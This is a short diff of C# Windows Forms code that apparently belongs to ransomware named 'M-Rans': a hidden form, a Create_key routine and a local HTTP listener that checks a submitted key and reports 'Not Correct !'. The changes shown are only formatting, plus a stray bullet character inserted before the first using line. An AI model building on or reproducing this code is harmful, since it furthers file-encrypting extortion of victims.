@@ -1,4 +1,4 @@
-﻿using System;
+﻿•using System;
 using System.Net;
 using System.Text;
 using System.Windows.Forms;
@@ -13,9 +13,7 @@ namespace M_Engine
         private HttpListener _listener;
 
         public hidden()
-        {
-            InitializeComponent();
-        }
+        { InitializeComponent(); }
         static void Create_key()
         {
             try
@@ -145,11 +143,8 @@ namespace M_Engine
 
                 if (request.HttpMethod == "POST" && request.Url.AbsolutePath == "/api/post/pass")
                 {
-                
-
                 string requestBody = new System.IO.StreamReader(request.InputStream).ReadToEnd();
                 string receivedKey = null;
-
                 string[] parameters = requestBody.Split('&');
                 foreach (var param in parameters)
                 {
@@ -182,7 +177,6 @@ namespace M_Engine
                 {
 
                     MessageBox.Show("Not Correct !", "M-Rans");
-
 
                     string responseString = "{\"error\":\"Invalid key\"}";
                     byte[] buffer = Encoding.UTF8.GetBytes(responseString);
